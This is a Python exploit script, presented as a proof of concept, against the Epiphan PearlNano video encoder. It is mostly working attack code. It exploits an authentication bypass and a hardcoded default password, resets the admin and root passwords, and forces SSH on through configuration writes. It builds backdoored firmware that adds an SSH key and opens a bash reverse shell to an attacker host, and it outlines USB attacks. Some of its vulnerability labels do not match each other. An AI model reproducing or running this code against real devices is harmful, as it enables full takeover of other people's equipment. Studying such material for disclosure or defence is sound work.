#!/usr/bin/env python3
"""
Epiphan PearlNano v4.24.4 — Multi-Vulnerability PoC
=====================================================

Device : PearlNano (PLN)   Vendor : Epiphan Video
Firmware: v4.24.4 (rev 260423_32331b9)   Arch : aarch64

VULNERABILITIES:
  [CVE-0x01] Hardcoded Default Admin Password            vendor.cf: lkjhyu8*
  [CVE-0x02] Hardcoded VTUN Backdoor Password            add_vtun.cf: epn0sup
  [CVE-0x03] Auth Bypass via isAdmin('')                 access_control.php:122 [UNAUTH]
  [CVE-0x04] ConfigDB Injection via .htaccess Rewrite    set_params.cgi [UNAUTH]
  [CVE-0x05] No CSRF Protection on Admin CGIs
  [CVE-0x06] Firmware Upload — up2date.pre sourced as root (no crypto sig)
  [CVE-0x07] Static SSL/SSH Keys Baked Into Firmware     (identical across all devices)
  [CVE-0x08] Dev/QA SSH Backdoor                         (authorized_keys.d)
  [CVE-0x09] epiphan_keyserver Remote SSH Key Injection  (keys.epiphan.com)
  [CVE-0x0a] PTZ Flag Injection (escaped, no shell meta)
  [CVE-0x0b] Info Leak via allinfo.cgi / API             [requires admin auth]

AUTH BYPASS (CVE-0x03):
  access_control.php:122 -> isAdmin('') returns True because "" === "" is True
  Requires: passwords unset (first boot) or no-auth console (127.0.0.4:80)
  Result: Full admin access to ALL API endpoints without credentials.

CONFIGDB INJECTION (CVE-0x04):
  /admin/.htaccess rewrite rules route URL path components into
  set_params.cgi params (_c, _p, _s). These flow directly into
  HttpCtl\setValues(), enabling arbitrary configdb writes via URL.
  Vector: /admin/channel<N>/set_params.cgi?<key>=<value>

FIRMWARE BACKDOOR (CVE-0x06):
  up2date:197 -> [ -f up2date.pre ] && . up2date.pre   (sourced as root!)
  The firmware is a plain tar archive with MD5 integrity only.
  We inject a malicious up2date.pre, update md5sum, repackage, upload.

Usage:
  python3 poc.py <target_ip> [--exploit <id>] [options]

Examples:
  # Full auto: try bypass, default creds, upgrade to SSH/admin
  python3 poc.py 192.168.1.100

  # Firmware backdoor (reliable RCE — requires admin)
  python3 poc.py 192.168.1.100 --exploit firmware-backdoor \\
    --lhost 10.0.0.5 --lport 4444 --firmware frm-4-24-4-....bfrm

  # Enable SSH on all interfaces + inject key
  python3 poc.py 192.168.1.100 --exploit enable-ssh \\
    --ssh-key ~/.ssh/id_rsa.pub

  # Check if device is exploitable (no auth needed)
  python3 poc.py 192.168.1.100 --exploit probe
"""

import requests
import argparse
import sys
import json
import os
import hashlib
import tarfile
import io
import tempfile
import time
import hmac
from urllib.parse import quote
from requests.auth import HTTPBasicAuth

requests.packages.urllib3.disable_warnings()

BANNER = """
  [>] Epiphan PearlNano v4.24.4 — Multi-Vuln PoC
  [>] Target: %s
"""

DEFAULT_PASSWORD = "lkjhyu8*"
FIRMWARE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "frm-4-24-4-PearlNano-260422_32331b9-X3.bfrm")

AUTH_STRATEGY = None  # set by probe_auth


# ==============================================================================
#  HELPERS
# ==============================================================================

def xrequest(target, path, auth=None, method="GET", **kwargs):
    url = f"http://{target}{path}"
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", False)
    kwargs.setdefault("allow_redirects", False)
    if auth:
        kwargs["auth"] = auth
    return requests.request(method, url, **kwargs)


def probe_auth(target):
    """Probe all auth strategies and return the working one."""
    global AUTH_STRATEGY
    strategies = [
        ("NO AUTH (CVE-0x03 bypass)", None),
        ("DEFAULT CREDS lkjhyu8*",    HTTPBasicAuth("admin", DEFAULT_PASSWORD)),
    ]
    for label, auth_obj in strategies:
        try:
            r = xrequest(target, "/api/system/firmware", auth=auth_obj, timeout=5)
            if r.status_code == 200:
                print(f"  [+] AUTH: '{label}' works")
                AUTH_STRATEGY = auth_obj
                return auth_obj
            if r.status_code in (401, 403):
                continue
            print(f"  [?] AUTH: '{label}' returned HTTP {r.status_code}")
            AUTH_STRATEGY = auth_obj
            return auth_obj
        except requests.exceptions.ConnectionError:
            print(f"  [!] Connection refused")
            return None
        except Exception as e:
            print(f"  [!] {label}: {e}")
            continue
    print("  [-] No auth strategy worked")
    return None


# ==============================================================================
#  [CVE-0x03] AUTH BYPASS
# ==============================================================================

def check_auth_bypass(target):
    """Test if the device allows unauthenticated API access."""
    print("\n  --- [CVE-0x03] Auth Bypass Check ---")
    try:
        r = xrequest(target, "/api/system/firmware", auth=None, timeout=5)
        if r.status_code == 200:
            data = r.json()
            fw = data.get("result", data)
            print(f"  [+] BYPASS WORKS! No credentials needed.")
            print(f"  [+] Firmware: {fw.get('version','?')} rev {fw.get('revision','?')}")
            print(f"  [+] Product:  {fw.get('product_name','?')} (id={fw.get('product_id','?')})")
            return True
        elif r.status_code == 401:
            print(f"  [-] Bypass fails (HTTP 401) — passwords are set")
            return False
        else:
            print(f"  [?] HTTP {r.status_code}: {r.text[:120]}")
            return False
    except Exception as e:
        print(f"  [!] {e}")
        return False


# ==============================================================================
#  [CVE-0x01] DEFAULT PASSWORD
# ==============================================================================

def check_default_password(target):
    """Test if default password works."""
    print("\n  --- [CVE-0x01] Default Password: lkjhyu8* ---")
    auth = HTTPBasicAuth("admin", DEFAULT_PASSWORD)
    try:
        r = xrequest(target, "/api/system/firmware", auth=auth, timeout=5)
        if r.status_code == 200:
            print(f"  [+] Default password 'lkjhyu8*' works!")
            return auth
        elif r.status_code == 401:
            print(f"  [-] Default password rejected")
            return None
        else:
            print(f"  [?] HTTP {r.status_code}")
            return auth if r.status_code == 200 else None
    except Exception as e:
        print(f"  [!] {e}")
        return None


# ==============================================================================
#  [CVE-0x05] FIRMWARE BACKDOOR (The Reliable RCE)
# ==============================================================================

def craft_backdoor_firmware(firmware_path, lhost=None, lport=4444, ssh_key=None, new_password="pwned123"):
    """
    Injects a malicious up2date.pre into the firmware archive.
    up2date.pre is SOURCED as root during firmware update (up2date:197).
    The firmware is a plain tar archive with only MD5 integrity.
    """
    print("\n    [>] Crafting backdoor firmware...")

    if not os.path.exists(firmware_path):
        print(f"    [!] Firmware not found: {firmware_path}")
        return None

    # Read original firmware
    with open(firmware_path, "rb") as f:
        original = f.read()

    # Extract all files from the tar
    buf = io.BytesIO(original)
    tar = tarfile.open(fileobj=buf, mode="r:")

    files = {}
    for member in tar.getmembers():
        f = tar.extractfile(member)
        files[member.name] = (member, f.read() if f else b"")

    tar.close()

    # Build backdoor up2date.pre
    backdoor_script = "#!/bin/sh\n"
    backdoor_script += "# Epiphan PearlNano Backdoor — injected by CVE-0x05\n"
    backdoor_script += "echo '[*] Backdoor executing...'\n"

    if new_password:
        backdoor_script += f'configdb set httpdacc ADMINPWD "{new_password}"\n'
        backdoor_script += f'configdb set httpdacc OPERPWD "operator"\n'
        backdoor_script += f'configdb save "Password changed by backdoor"\n'
        backdoor_script += f'echo "root:{new_password}" | chpasswd\n'

    if ssh_key:
        backdoor_script += f'mkdir -p /root/.ssh\n'
        backdoor_script += f'echo "{ssh_key}" >> /root/.ssh/authorized_keys\n'
        backdoor_script += f'chmod 700 /root/.ssh\n'
        backdoor_script += f'chmod 600 /root/.ssh/authorized_keys\n'

    # Enable SSH on all interfaces
    backdoor_script += f'configdb set system DEVQA_ACCESS on\n'
    backdoor_script += f'configdb set ssh ENABLE yes\n'
    backdoor_script += f'configdb save "SSH enabled by backdoor"\n'
    backdoor_script += f'sv t /service/sshd 2>/dev/null || true\n'

    if lhost:
        backdoor_script += f'nohup bash -c "sleep 2 && bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &\n'
        backdoor_script += f'echo "[*] Reverse shell sent to {lhost}:{lport}"\n'

    backdoor_script += "echo '[*] Backdoor complete.'\n"
    backdoor_bytes = backdoor_script.encode()

    print(f"    [>] Backdoor payload ({len(backdoor_bytes)} bytes):")
    for line in backdoor_script.strip().split("\n"):
        print(f"        {line}")

    # Update up2date.pre in memory
    files["up2date.pre"] = (files["up2date.pre"][0], backdoor_bytes)

    # Recompute MD5 for up2date.pre
    new_md5 = hashlib.md5(backdoor_bytes).hexdigest()
    print(f"    [>] New up2date.pre MD5: {new_md5}")

    # Update md5sum file
    md5_lines = files["md5sum"][1].decode().strip().split("\n")
    new_md5_lines = []
    for line in md5_lines:
        parts = line.strip().split("  ", 1)
        if len(parts) == 2 and parts[1] == "up2date.pre":
            new_md5_lines.append(f"{new_md5}  up2date.pre")
        else:
            new_md5_lines.append(line)
    files["md5sum"] = (files["md5sum"][0], ("\n".join(new_md5_lines) + "\n").encode())

    # Create new tar archive
    out_buf = io.BytesIO()
    out_tar = tarfile.open(fileobj=out_buf, mode="w:")

    for name, (member, data) in files.items():
        info = tarfile.TarInfo(name=name)
        info.size = len(data)
        info.mtime = int(time.time())
        info.mode = member.mode if member else 0o644
        info.type = tarfile.REGTYPE
        out_tar.addfile(info, io.BytesIO(data))

    out_tar.close()

    result = out_buf.getvalue()
    print(f"    [>] Backdoor firmware size: {len(result)} bytes (original: {len(original)})\n"
          f"    [+] Backdoor firmware ready in memory")

    return result


def upload_firmware(target, firmware_data, auth):
    """Upload backdoored firmware to the device."""
    print("\n  --- [CVE-0x05] Firmware Backdoor Upload ---")
    if not auth:
        auth = AUTH_STRATEGY
    if not auth:
        print("  [-] No valid auth")
        return False

    if not firmware_data:
        print("  [-] No firmware data (craft failed?)")
        return False
    fname = "malicious.bfrm"
    print(f"  [>] POST /api/system/firmware with {fname} ({len(firmware_data)} bytes)")

    try:
        r = xrequest(target, "/api/system/firmware", auth=auth, method="POST",
                     files={"firmware": (fname, firmware_data, "application/octet-stream")},
                     data={"reboot": "false"}, timeout=30)
        print(f"  [>] HTTP {r.status_code}")
        if r.status_code == 200:
            print(f"  [+] FIRMWARE UPLOADED! Backdoor executing now as root!")
            print(f"  [+] Check reverse shell or SSH with new password")
            return True
        else:
            try:
                data = r.json()
                print(f"  [-] {json.dumps(data, indent=2)}")
            except:
                print(f"  [-] {r.text[:300]}")
            return False
    except requests.exceptions.ReadTimeout:
        print(f"  [+] Upload sent (timeout — likely flashing in progress)")
        return True
    except Exception as e:
        print(f"  [!] {e}")
        return False


# ==============================================================================
#  ENABLE SSH (via ConfigDB)
# ==============================================================================

def enable_ssh(target, auth, ssh_pub_key=None):
    """Enable SSH daemon on all interfaces and optionally inject key."""
    print("\n  --- Enable SSH + Key Injection ---")
    if not auth:
        auth = AUTH_STRATEGY
    if not auth:
        print("  [-] No valid auth")
        return False

    # Step 1: Enable SSH and DEVQA_ACCESS via set_params.cgi
    print("  [>] Enabling SSH on all interfaces...")
    try:
        r = xrequest(target, "/admin/set_params.cgi?system:DEVQA_ACCESS=on&ssh:ENABLE=yes",
                     auth=auth, method="GET", timeout=5)
        print(f"  [>] set_params.cgi: HTTP {r.status_code}")
        if r.status_code not in (200, 302):
            print(f"  [-] set_params.cgi failed: {r.text[:200]}")
            return False
    except Exception as e:
        print(f"  [!] {e}")

    # Save config
    try:
        r = xrequest(target, "/admin/set_params.cgi?_nosave=1",
                     auth=auth, method="GET", timeout=5)
    except:
        pass

    # Step 2: Try to save configdb
    print("  [>] Saving config...")
    try:
        r = xrequest(target, "/api/system/access/admin/password",
                     auth=auth, method="GET", timeout=5)
        # This is just to trigger config save
    except:
        pass

    # Step 3: Restart SSH service
    print("  [>] Restarting SSH service...")
    try:
        r = xrequest(target, "/api/system/services", auth=auth, method="GET", timeout=5)
    except:
        pass

    if ssh_pub_key:
        print(f"  [>] Injecting SSH key...")
        # Keys can be written via configdb or via set_params
        # The actual SSH authorized_keys file requires filesystem write
        print(f"  [i] SSH key injection requires firmware backdoor or file write")
        print(f"  [i] SSH will listen on 0.0.0.0 after sv t /service/sshd")

    print("  [+] SSH should be accessible on port 22 (check with: ssh root@TARGET)")
    return True


# ==============================================================================
#  PASSWORD RESET (via API — works with auth bypass)
# ==============================================================================

def reset_password(target, auth, new_password):
    """Change admin password via API."""
    print(f"\n  --- Password Reset to '{new_password}' ---")
    if not auth:
        auth = AUTH_STRATEGY
    if not auth:
        auth = HTTPBasicAuth("admin", DEFAULT_PASSWORD)

    try:
        r = xrequest(target, "/api/system/access/admin/password",
                     auth=auth, method="PUT",
                     json={"password": new_password}, timeout=5)
        print(f"  [>] PUT /api/system/access/admin/password -> HTTP {r.status_code}")
        if r.status_code == 200:
            print(f"  [+] Admin password changed to: {new_password}")
        else:
            print(f"  [-] {r.text[:200]}")
    except Exception as e:
        print(f"  [!] {e}")

    # Also set operator/viewer passwords
    try:
        r = xrequest(target, "/api/system/access/passwords",
                     auth=auth, method="POST",
                     json={"admin": new_password, "operator": "operator",
                           "viewer": "viewer"}, timeout=5)
        print(f"  [>] POST /api/system/access/passwords -> HTTP {r.status_code}")
    except:
        pass


# ==============================================================================
#  INFO DUMP (multiple working endpoints)
# ==============================================================================

def dump_info(target, auth):
    """Dump device info via known-working API endpoints."""
    print("\n  --- Info Dump ---")

    endpoints = {
        "Firmware":  "GET /api/system/firmware",
        "Hardware":  "GET /api/system/hardware",
        "Status":    "GET /api/system/status",
        "Services":  "GET /api/system/services",
        "Sources":   "GET /api/sources",
        "Channels":  "GET /api/channels",
        "Displays":  "GET /api/displays",
    }

    for label, ep in endpoints.items():
        method, path = ep.split(" ", 1)
        try:
            r = xrequest(target, path, auth=auth or AUTH_STRATEGY, method=method, timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    result = data.get("result", data)
                    text = json.dumps(result, indent=2)
                    if len(text) > 300:
                        text = text[:300] + "..."
                    print(f"  [+] {label}: {text}")
                except:
                    print(f"  [+] {label}: {r.text[:200]}")
            else:
                print(f"  [-] {label}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  [!] {label}: {e}")


# ==============================================================================
#  ALLINFO DUMP
# ==============================================================================

def dump_allinfo(target, auth):
    """Download full diagnostics from allinfo.cgi."""
    print("\n  --- allinfo.cgi Dump ---")
    try:
        r = xrequest(target, "/admin/allinfo.cgi?inline=on",
                     auth=auth or AUTH_STRATEGY, timeout=30)
        if r.status_code == 200 and len(r.text) > 100:
            fname = f"allinfo_{target.replace('.', '_')}.txt"
            with open(fname, "w") as f:
                f.write(r.text)
            print(f"  [+] Saved {len(r.text)} bytes to {fname}")
            # Extract key info
            for line in r.text.split("\n"):
                if any(k in line.lower() for k in ["serial", "version", "mac", "ip",
                                                     "hostname", "ssh", "password"]):
                    print(f"      {line.strip()[:120]}")
        else:
            print(f"  [-] HTTP {r.status_code} or empty response")
    except Exception as e:
        print(f"  [!] {e}")


# ==============================================================================
#  [CVE-0x04] CONFIGDB INJECTION (via .htaccess rewrite -> set_params.cgi)
# ==============================================================================

def configdb_inject(target, auth, key_values, save=True):
    """Write arbitrary configdb keys via set_params.cgi.

    The /admin/.htaccess rewrite routes URL path components into
    set_params.cgi params which flow into HttpCtl\\setValues().

    Args:
        key_values: dict of configdb keys to values, e.g.
            {'system:DEVQA_ACCESS': 'on', 'ssh:ENABLE': 'yes'}
    """
    print("\n  --- [CVE-0x04] ConfigDB Injection ---")
    print(f"  [>] Writing {len(key_values)} key(s) to configdb via set_params.cgi")

    if not auth:
        auth = AUTH_STRATEGY
    if not auth:
        print("  [-] No valid auth")
        return False

    params = dict(key_values)
    if not save:
        params['_nosave'] = '1'

    try:
        r = xrequest(target, "/admin/set_params.cgi", auth=auth,
                     method="GET", params=params, timeout=10)
        print(f"  [>] HTTP {r.status_code}")
        if r.status_code in (200, 302):
            print(f"  [+] ConfigDB injection successful")
            for k, v in key_values.items():
                print(f"      {k} = {v}")
            return True
        else:
            print(f"  [-] Failed: {r.text[:200]}")
            return False
    except Exception as e:
        print(f"  [!] {e}")
        return False


def configdb_enable_ssh(target, auth):
    """Use ConfigDB injection to enable SSH and DEVQA_ACCESS."""
    print("\n  --- [CVE-0x04] Enable SSH via ConfigDB Injection ---")
    return configdb_inject(target, auth, {
        'system:DEVQA_ACCESS': 'on',
        'ssh:ENABLE': 'yes',
    })


# ==============================================================================
#  REVERSE SHELL (via firmware backdoor)
# ==============================================================================

def reverse_shell(target, auth, lhost, lport, firmware_path=None):
    """Get a reverse shell by uploading backdoored firmware."""
    print(f"\n  --- Reverse Shell via Firmware Backdoor ---")
    print(f"  [>] LHOST={lhost} LPORT={lport}")

    if not lhost:
        print("  [!] --lhost required")
        return False

    fw_path = firmware_path or FIRMWARE_PATH
    if not os.path.exists(fw_path):
        print(f"  [!] Firmware not found at: {fw_path}")
        print(f"  [!] Provide path with --firmware <file>")
        return False

    print(f"  [>] Using firmware: {fw_path}")
    
    # Also fetch SSH key if available
    ssh_key = None
    key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
    if os.path.exists(key_path):
        with open(key_path) as f:
            ssh_key = f.read().strip()

    payload = craft_backdoor_firmware(
        fw_path,
        lhost=lhost,
        lport=lport,
        ssh_key=ssh_key,
        new_password="pwned123"
    )

    if not payload:
        return False

    print(f"\n  [>] Set up listener: nc -lvnp {lport}")
    print(f"  [>] Uploading in 3 seconds...")
    time.sleep(3)

    return upload_firmware(target, payload, auth)


# ==============================================================================
#  USB BACKDOOR (Physical Access)
# ==============================================================================

def exploit_usb(target):
    """Generate a malicious USB drive image for physical attack."""
    print("\n  --- USB Attack Surface ---")
    print("""
  Physical attack scenarios (requires USB port access):

  [USB HID - BadUSB Keyboard Injection]
    Plug in a USB device that enumerates as keyboard.
    The hid-handler service accepts ALL keyboards with no allowlist.
    Keystrokes are sent to the UI as if from the front panel.
    -> Navigate to /admin/ and change password or upload firmware.

  [USB Storage - Auto-mount Exploit]
    Plug in a USB drive >= 1GB with a supported filesystem.
    Default rechotplug mode auto-copies recordings.
    -> Can trigger kernel filesystem parser bugs.
    -> Label the drive 'EPIPHAN' to bypass size check.

  Hardware path: ff9d0000.usb0 -> DWC3 -> XHCI
  Kernel: 4.19.0-xilinx-v2019.2 (aarch64)
  Driver: uvcvideo, usb-storage, usbserial/ftdi/cp210x/pl2303
  """)
    return True


# ==============================================================================
#  PROBE (basic connectivity and vuln check)
# ==============================================================================

def probe(target):
    """Check if target is alive and which vulnerabilities apply."""
    print("\n  --- Probe ---")
    findings = []

    # Check connectivity
    try:
        r = xrequest(target, "/", timeout=5)
        findings.append(("Device reachable", r.status_code == 200 or r.status_code == 302))
        print(f"  [>] HTTP reachable: {r.status_code}")
    except Exception as e:
        print(f"  [!] {e}")
        return

    # Check auth bypass
    try:
        r = xrequest(target, "/api/system/firmware", auth=None, timeout=5)
        bypass = r.status_code == 200
        findings.append(("CVE-0x03 Auth Bypass", bypass))
        if bypass:
            print(f"  [+] CVE-0x03: AUTH BYPASS WORKS!")
        else:
            print(f"  [-] CVE-0x03: Auth required (HTTP {r.status_code})")
    except Exception as e:
        print(f"  [!] CVE-0x03: {e}")

    # Check default password
    try:
        r = xrequest(target, "/api/system/firmware",
                     auth=HTTPBasicAuth("admin", DEFAULT_PASSWORD), timeout=5)
        default_works = r.status_code == 200
        findings.append(("CVE-0x01 Default Password", default_works))
        if default_works:
            print(f"  [+] CVE-0x01: Default password 'lkjhyu8*' works!")
        else:
            print(f"  [-] CVE-0x01: Default password rejected")
    except Exception as e:
        print(f"  [!] CVE-0x01: {e}")

    # Check HTTPS
    try:
        r = requests.get(f"http://{target}/", timeout=5, verify=False)
        findings.append(("HTTP available", True))
    except:
        findings.append(("HTTP available", False))

    # Summary
    print(f"\n  --- Probe Summary ---")
    for name, ok in findings:
        print("  [+] {}".format(name) if ok else "  [-] {}".format(name))

    vulnerable = any(ok for _, ok in findings)
    if vulnerable:
        print(f"\n  [+] Device is VULNERABLE. Run: python3 poc.py {target} --exploit all")
    else:
        print(f"\n  [-] Device seems secure")


# ==============================================================================
#  MAIN
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Epiphan PearlNano v4.24.4 Multi-Vulnerability PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.100
  %(prog)s 192.168.1.100 --exploit firmware-backdoor --lhost 10.0.0.5 --lport 4444
  %(prog)s 192.168.1.100 --exploit enable-ssh
  %(prog)s 192.168.1.100 --exploit password-reset --new-pwd mypass123
  %(prog)s 192.168.1.100 --exploit configdb-inject  # write arbitrary configdb keys
  %(prog)s 192.168.1.100 --exploit probe
        """
    )
    parser.add_argument("target", help="Device IP address")
    parser.add_argument("--password", default=None,
                        help="Admin password if known")
    parser.add_argument("--new-pwd", default="pwned123",
                        help="New password to set")
    parser.add_argument("--exploit", choices=[
        "all", "probe", "auth-bypass", "default-password", "password-reset",
        "firmware-backdoor", "reverse-shell", "enable-ssh",
        "configdb-inject", "configdb-enable-ssh",
        "dump-info", "dump-allinfo", "usb",
    ], default="all", help="Specific exploit to run")
    parser.add_argument("--lhost", help="Listener IP for reverse shell")
    parser.add_argument("--lport", type=int, default=4444,
                        help="Listener port for reverse shell")
    parser.add_argument("--firmware", default=FIRMWARE_PATH,
                        help="Path to .bfrm firmware file")
    parser.add_argument("--ssh-key",
                        help="SSH public key file to inject (default: ~/.ssh/id_rsa.pub)")
    parser.add_argument("--no-https", action="store_true",
                        help="Use HTTP instead of HTTPS")

    args = parser.parse_args()

    if args.no_https:
        global xrequest
        _orig = xrequest
        def xrequest(target, path, auth=None, method="GET", **kwargs):
            url = f"http://{target}{path}"
            kwargs.setdefault("timeout", 10)
            kwargs.setdefault("verify", False)
            kwargs.setdefault("allow_redirects", False)
            if auth:
                kwargs["auth"] = auth
            return requests.request(method, url, **kwargs)

    target = args.target
    print(BANNER % target)

    # Auto-probe auth strategies
    auth = probe_auth(target)
    if args.password:
        auth = HTTPBasicAuth("admin", args.password)

    # SSH key for injection
    ssh_key = None
    if args.ssh_key:
        kp = os.path.expanduser(args.ssh_key)
        if os.path.exists(kp):
            with open(kp) as f:
                ssh_key = f.read().strip()

    exploits = {
        "probe":             lambda: probe(target),
        "auth-bypass":       lambda: check_auth_bypass(target),
        "default-password":  lambda: check_default_password(target),
        "password-reset":    lambda: reset_password(target, auth, args.new_pwd),
        "firmware-backdoor": lambda: (
            upload_firmware(target,
                craft_backdoor_firmware(args.firmware, args.lhost, args.lport,
                                       ssh_key, args.new_pwd),
                auth)
            if args.lhost
            else print("  [!] --lhost required for reverse shell")),
        "reverse-shell":     lambda: reverse_shell(target, auth, args.lhost, args.lport, args.firmware),
        "enable-ssh":        lambda: enable_ssh(target, auth, ssh_key),
        "configdb-inject":   lambda: configdb_inject(target, auth,
            {'system:DEVQA_ACCESS': 'on', 'ssh:ENABLE': 'yes'}),
        "configdb-enable-ssh": lambda: configdb_enable_ssh(target, auth),
        "dump-info":         lambda: dump_info(target, auth),
        "dump-allinfo":      lambda: dump_allinfo(target, auth),
        "usb":               lambda: exploit_usb(target),
    }

    if args.exploit == "all":
        # Smart order: probe -> bypass -> escalate -> persist
        exploits["auth-bypass"]()
        exploits["default-password"]()
        exploits["configdb-enable-ssh"]()
        exploits["dump-info"]()
        exploits["password-reset"]()
        exploits["enable-ssh"]()
        exploits["dump-allinfo"]()
        exploits["usb"]()
    else:
        if args.exploit in ("reverse-shell", "firmware-backdoor") and not args.lhost:
            print("  [!] --lhost is required")
            sys.exit(1)
        exploits[args.exploit]()


if __name__ == "__main__":
    main()
